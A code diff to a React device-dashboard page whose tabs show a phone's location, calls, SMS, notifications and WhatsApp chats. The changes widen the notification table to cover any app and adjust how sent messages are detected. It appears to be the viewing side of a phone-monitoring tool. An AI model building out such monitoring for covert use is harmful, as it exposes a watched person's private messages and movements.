@@ -52,7 +52,7 @@ const TABS: { key: Tab; label: string }[] = [
   { key: 'map',       label: '\u{1F5FA} Location' },
   { key: 'calls',     label: '\u{1F4DE} Calls' },
   { key: 'sms',       label: '\u{1F4AC} SMS' },
-  { key: 'wa_notifs', label: '\u{1F514} WA Notifs' },
+  { key: 'wa_notifs', label: '\u{1F514} Notifications' },
   { key: 'wa_chats',  label: '\u{1F4AC} WA Chats' },
 ]
 
@@ -239,16 +239,25 @@ export default function DevicePage() {
         {tab === 'wa_notifs' && (
           <div className="bg-white rounded-xl shadow-sm overflow-hidden">
             <table className="w-full border-collapse">
-              <thead><tr><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
+              <thead><tr><TH>App</TH><TH>Sender</TH><TH>Message</TH><TH>Time</TH></tr></thead>
               <tbody>
                 {whatsapp.map((w, i) => (
                   <tr key={i} className="hover:bg-gray-50">
+                    <TD>
+                      <div className="flex items-center gap-2">
+                        {w.appIcon
+                          ? <img src={`data:image/png;base64,${w.appIcon}`} alt="" className="w-6 h-6 rounded" />
+                          : <span className="text-lg">{'\u{1F4E6}'}</span>
+                        }
+                        <span className="font-medium text-gray-800">{w.appName || w.appPackage}</span>
+                      </div>
+                    </TD>
                     <TD className="font-medium">{w.sender}</TD>
                     <TD>{w.message}</TD>
                     <TD>{fmt(w.timestamp)}</TD>
                   </tr>
                 ))}
-                {whatsapp.length === 0 && <tr><td colSpan={3} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
+                {whatsapp.length === 0 && <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No notifications yet.</td></tr>}
               </tbody>
             </table>
           </div>
@@ -320,7 +329,7 @@ export default function DevicePage() {
                     style={{ backgroundColor: '#efeae2' }}
                   >
                     {activeMsgs.map((m, i) => {
-                      const isMe = m.sender !== m.chat
+                      const isMe = m.sender === '__me__'
                       const showSender = !isMe && (i === 0 || activeMsgs[i - 1].sender !== m.sender)
                       return (
                         <div key={i} className={`flex ${isMe ? 'justify-end' : 'justify-start'}`}>
